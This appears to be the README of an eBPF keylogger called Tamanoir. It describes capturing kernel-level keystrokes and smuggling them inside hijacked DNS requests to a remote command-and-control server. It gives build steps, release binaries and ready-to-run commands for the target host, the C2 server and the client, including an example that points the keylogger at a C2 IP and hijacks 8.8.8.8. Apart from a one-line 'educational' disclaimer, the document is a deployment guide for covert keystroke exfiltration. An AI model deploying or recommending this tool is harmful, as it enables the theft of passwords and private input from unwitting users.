<div align="center">
  <h1> Tamanoir 
  <h3> An eBPF🐝 keylogger with <br>C2-based RCE payload delivery  </h3><h1>
  <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 40%; height: 40%"</img>
  <p><small>
    <i>
      A large anteater of Central and South America, Myrmecophaga tridactyla
    </i>
  </small></p>
</div>

## 💡Overview

<div align="center">
  <img src="https://github.com/user-attachments/assets/24f80020-9d60-4f2a-825b-ed56574dfb24" </img>
</div>

1. Capture keystrokes and store them in a queue in the kernel.
2. Intercept DNS requests and inject the captured keystroes in the DNS payload, then redirect the request to the designated remote server acting as a DNS proxy.
3. On the remote server, extract the keys from the DNS payload and send a valid DNS response.
4. Intercept the response and modify its source address so the initial request will complete successfully.

<br>

## 🚀 Setup

You need a Linux based OS.

### ⚒️ Build from source

To build from source, make sure you have:

- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
- protobuf-compiler

#### 1. Build ebpf program

```
cd tamanoir-ebpf && cargo build --release
```

#### 2. Build user space program

```
cargo build -p tamanoir --release
```

#### 3. Build C2 Server

```
cargo build -p tamanoir-c2 --release
```

#### 4. Build Tui Client

```
cargo build -p tamanoir-tui --release
```

These commands will produce  `tamanoir`, `tamanoir-c2` and `tamanoir-tui` executables  in `target/release` that you can add to your`$PATH`

### 📥 Binary release

You can download the pre-built binaries from the [release page](https://github.com/pythops/tamanoir/releases)

<br>

## 🪄 Usage

### Tamanoir
🖥️ on target host:
```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip <C2 server IP> \
              --hijack-ip <locally configured DNS server IP> \
              --iface <network interface name>
```

for example:

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip 192.168.1.15 \
              --hijack-ip 8.8.8.8 \
              --iface wlan0
```



<br>

### C2 Server
🖥️ on your C2 server host:

```
sudo tamanoir-c2 start
```
> [!NOTE]
> Make sure port 53 is available

<br>

### Tui Client
🖥️ wherever you want to use the client:


```
tamanoir-tui -i  <C2 server IP> 
```
> [!NOTE]
> Make sure C2 server is reachable on port 50051

<br>

## ⚠️ Disclaimer

`Tamanoir` is developed for educational purposes only

<br>

## ✍️ Authors

[Adrien Gaultier](https://github.com/adgaultier)
[Badr Badri](https://github.com/pythops)

<br>

## ⚖️ License

GPLv3
